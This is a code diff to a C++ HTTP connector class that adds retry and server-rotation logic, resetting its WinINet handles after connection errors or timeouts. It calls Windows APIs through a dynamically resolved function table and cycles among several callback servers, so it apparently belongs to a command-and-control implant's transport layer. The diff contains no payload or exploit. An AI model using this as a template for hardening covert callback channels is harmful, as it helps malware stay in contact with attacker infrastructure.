@@ -34,7 +34,6 @@ int _atoi(const char* str)
 	return result * sign;
 }
 
-
 ConnectorHTTP::ConnectorHTTP()
 {
 	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
@@ -75,26 +74,23 @@ void ConnectorHTTP::SetConfig( BOOL Ssl, CHAR* UserAgent, CHAR* Method, ULONG Ad
 
 BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 {
-	BOOL  result  = FALSE;
-	DWORD context = 0;
-	BYTE* recv    = NULL;
-	*recv_size    = 0;
+	ULONG attempt   = 0;
+	BOOL  connected = false;
+	BOOL  result    = FALSE;
+	DWORD context   = 0;
+	BYTE* recv      = NULL;
+	*recv_size      = 0;
 
-	if( !this->hInternet )
-		this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	while ( !connected && attempt < this->server_count) {
+		DWORD dwError = 0;
 
-	if ( this->hInternet ) {
-		ULONG attempt   = 0;
-		BOOL  connected = false;
-		while ( !connected && attempt < this->server_count) {
-
-			if (attempt && this->hConnect) {
-				this->functions->InternetCloseHandle(this->hConnect);
-				this->hConnect = NULL;
-			}
+		if (!this->hInternet)
+			this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+		if ( this->hInternet ) {
 
 			if ( !this->hConnect )
 				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
+
 			if ( this->hConnect )
 			{
 				CHAR acceptTypes[] = { '*', '/', '*', 0 };
@@ -175,13 +171,31 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 							}
 						}
 					}
+					else {
+						dwError = this->functions->GetLastError();
+					}
 					this->functions->InternetCloseHandle(hRequest);
 				}
 			}
 
 			attempt++;
-			if(!connected)
+			if (!connected) {
+				if ( dwError == ERROR_INTERNET_CANNOT_CONNECT || dwError == ERROR_INTERNET_TIMEOUT ) {
+					if (this->hConnect) {
+						this->functions->InternetCloseHandle(this->hConnect);
+						this->hConnect = NULL;
+					}
+					if (this->hInternet) {
+						this->functions->InternetCloseHandle(this->hInternet);
+						this->hInternet = NULL;
+					}
+
+					this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+					this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
+				}
+
 				this->server_index = (this->server_index + 1) % this->server_count;
+			}
 		}
 	}
 	return recv;
